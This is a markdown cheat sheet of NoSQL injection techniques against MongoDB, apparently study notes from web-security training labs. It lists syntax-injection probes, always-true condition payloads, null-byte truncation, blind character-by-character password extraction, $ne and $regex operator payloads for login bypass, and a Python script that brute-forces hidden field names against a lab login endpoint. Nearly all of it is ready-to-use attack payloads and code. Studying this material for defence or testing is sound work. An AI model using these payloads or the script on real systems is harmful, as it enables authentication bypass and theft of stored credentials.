
# Content
- [syntax injection](#syntax-injection)
  - [Detecting syntax injection](#Detecting-syntax-injection)
  - [Overriding existing conditions](#Overriding-existing-conditions)
  - [extract data](#extract-data)
- [NoSQL operator injection](#NoSQL-operator-injection)
  - [Submitting query operators](#submitting-query-operators)
  - [Extracting field names](#extracting-field-names)
  - [Exfiltrating data](#exfiltrating-data)

## syntax injection 
- this type is very rare now

consider this mongodb query for the following examples : 
```js
db.users.find({ $where: function () { return this.name == <userInput> } });
```
or 
```js
 db.users.find({ $expr: { $function: { body: function (name) {return name == <userInput>;}, args: ["$name"], lang: "js" } } })
```


#### **Detecting syntax injection**
- submit strings and special characters that trigger a database error or some other detectable behavior 
EX : mongodb 
```mongodb
'"`{
;$Foo}
$Foo \xYZ
```
Url version : 
```url
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```
- In some applications, you may need to inject your payload via a JSON property instead 
JSON version :
```

'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```

- Determining which characters are processed 
```
https://insecure-website.com/product/lookup?category='    => cause error
https://insecure-website.com/product/lookup?category=\'   => work
```

- Confirming conditional behavior
```
' && 0 && 'x
' && 1 && 'x
```

#### **Overriding existing conditions**
payload:
```
fizzy'||'1'=='1
```
url sent:
```
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%31%7c%7c%27
```
mongodb query in backend :
```js
db.users.find({ $where: function () { return this.name == 'fizzy'||'1'=='1' } });
```

- You could also add a **null character** after the category value. MongoDB may ignore all characters after a null character. 
- This means that any additional conditions on the MongoDB query are ignored

**EX:** all products in the fizzy category are displayed, including unreleased products : 
```
db.products.find({ $where: function () { return 'fizzy'\u0000' && this.released == 1 });
```

#### **extract data**

to know some condtions 
```
admin' && this.password.match(/\d/) || 'a'=='b     => check if it has digits or no
```

check length
```
admin' && this.password.length < 30 || 'a'=='b
```

extract password
```
admin' && this.password[0] == 'a' || 'a'=='b
```

query in the backend
```js
db.users.find({$where : function(){ return this.name == "admin' && this.password[0] == 'a' || 'a'=='b' ; }}) ;
```





## NoSQL operator injection

Operator | Description
--- | ---
`$where` | Matches documents that satisfy a JavaScript expression. This operator allows you to write custom JavaScript functions to filter and select documents in a collection. It's a powerful but potentially slow operator, so use it with caution.
`$ne` | Matches all values that are not equal to a specified value. It's used to find documents where a specific field is not equal to a given value.
`$in` | Matches all of the values specified in an array. It's used to find documents where a specific field's value is one of the values in a provided array.
`$regex` | Selects documents where values match a specified regular expression. It's used for pattern matching to find documents with values that match a given regular expression pattern. This is especially useful for text-based searches.


#### **Submitting query operators**

In JSON:
```json
{"username":{"$ne":"invalid"}}
```
In URL-based:
```
GET : 

http://vulnApp/login/?username[$ne]=invalid

POST :

username[$ne]=invalid

```

**EX:** Auth bypass Example : 
```json 
{
"username":{
"$regex" : "admin.*"
},
"password":{
"$ne" : "ayklam"
}
}
```
#### **Extracting field names**

test
```json
{"username":"wiener","password":"peter", "$where":"0"}
{"username":"wiener","password":"peter", "$where":"1"}
```
exploit : where `c` is charctar and `i` is index
```json
{"username":"wiener","password":"peter", "$where":"Object.keys(this)[0].match('^.{<i>}<c>.*')"}
```
query in the backend
```js
db.users.find({$where : function(){ return Object.keys(this)[1].match('^.{<i>}<c>.*')  }}) ;
```
automation script 
```python
import requests 
from urllib.parse import quote
import string



success = 'Account locked' 
url = 'https://0ad800e004f9334a8010038800130094.web-security-academy.net/login' 




# Create a list containing a-zA-Z0-9
alphanumeric_characters = [char for char in string.ascii_letters + string.digits]



def doReq(i , c): 
    params ={"username":"carlos","password":{"$ne":"aaa"},"$where":'''Object.keys(this)[1].match('^.{{{}}}{}.*')'''.format(i,c,)}
    res = requests.post(url=url , json=params )
    return res.text 


filed = ""

for i in range(0,21):
    for c in alphanumeric_characters :    
         res = doReq(i,c)  
         if(success in res):
             filed = filed + c
             print(filed)
             continue
```

#### **Exfiltrating data**

For example:
```json
{"username":"myuser","password":"mypass"}
```
If the response to this request is different to the one you receive when you submit an incorrect password, this indicates that the application may be vulnerable
```json
{"username":"admin","password":{"$regex":"^.*"}}  
```
extract data
```json
{"username":"admin","password":{"$regex":"^a*"}}
```
